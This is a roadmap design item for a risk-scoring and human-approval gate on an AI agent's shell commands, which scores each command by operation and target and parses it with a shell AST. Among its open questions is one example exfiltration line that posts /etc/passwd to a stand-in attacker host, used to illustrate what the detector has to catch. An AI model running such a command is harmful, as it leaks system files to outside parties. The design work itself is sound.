---
id: R403
title: Command risk scoring and approval flow
state: shaped
horizon: next
domains: [core, host]
depends-on: []
converges-with: ["[[roadmap/items/R205-risk-scoring-and-security-profiles]]", "[[roadmap/items/R204-tool-approval-gate]]"]
split-from: []
absorbed-into: ""
feature: ""
origin: ["[[_archive/security-model/decisions#Current Decisions]]", "[[_archive/security-model/decisions#Command Approval Flow]]", "[[_archive/security-model/decisions#Risk Tiering (Command Parser)]]", "[[_archive/security-model/decisions#Shell AST Parsing]]", "[[_archive/security-model/decisions#Open Questions]]", "[[_archive/infrastructure-strategy/decisions#Build progress + revised seams (2026-07-01)]]"]
touched: 2026-09-22
---

# R403 — Command risk scoring and approval flow

## Idea

Gate every shell command the agent wants to run through a parsed risk score and a human
approval step.

**Approval flow.** Three user actions on any command needing approval:

- **Enter** — approve and execute.
- **Esc** — deny.
- **Shift+Enter** — opt-in contextual explanation: an LLM call that explains what the command
  does *in the context of the current conversation*, not a generic man page. The call is
  pre-fetched in the background when a command enters the "ask" tier; approving before it
  finishes cancels it; Shift+Enter shows it warm or a loading state.

The target device is shown prominently: "Run `rm -rf node_modules` on `prod-server`?
[approve / deny / explain]".

**Risk tiering by effects, not command names.** Decompose each command into
**operation × target** effects.

- Operation axis: read 0, metadata 1, local-write 2, append 2, overwrite 3, delete 4,
  execute 3, network-out 3, install 3, privilege 5.
- Target axis: project/cwd 0, temp 0, user home 1, package/runtime 2, network/remote 3,
  system config 4, system binaries 4, kernel/boot 5, root 5.
- Risk = operation × target; pipeline risk = max across all effects.
- Tiers: **auto-approve** (read-only, configurable threshold), **ask** (approve / deny /
  explain), **block** (policy rejects; never reaches the prompt).

**Shell AST parsing, not regex.** Must handle simple commands with flags and args; redirections
(`>` vs `>>` switches overwrite ↔ append); pipes and chains (`&&`, `||`, `;`); subshells and
command substitution (`$(...)`); variable expansion (unresolvable → assume worst-case target).
Conservative by default: anything the parser cannot fully analyze escalates to "ask", never
auto-approve.

Also surface tool lifecycle in the host: all tools emit events and step boundaries are visible.

## Why

Write and exec are dormant daemon primitives today precisely because nothing gates them. This
gate is the precondition for exposing them to the model.

## Open questions

- Overlaps [[roadmap/items/R204-tool-approval-gate]] (persisted approval state) and [[roadmap/items/R205-risk-scoring-and-security-profiles]] (the `security` protocol module); this item holds the security-model specifics (axis scores, AST requirements, approval keys). Candidate for `converges-with` or absorption.
- Parser: an existing library (bash-parser, mvdan-sh wasm) or a focused one?
- Safe handling of variable expansion and dynamically constructed commands.
- Should a block show its reason (leaks policy) or just "blocked"?
- Network exfiltration: distinguishing `curl localhost:3000` from `curl evil.com -d @/etc/passwd`.
- Per-command allowlists that override a block — how they compose with profiles
  ([[roadmap/items/R404-per-device-security-profiles]]).

## Constraints already decided

- Agent tools are read-only; write and exec stay daemon primitives: [[domains/core/decisions#^D013]].
- Tool failures become log events: [[domains/core/decisions#^D029]].

## History

- 2026-09-22 migrated from the archive
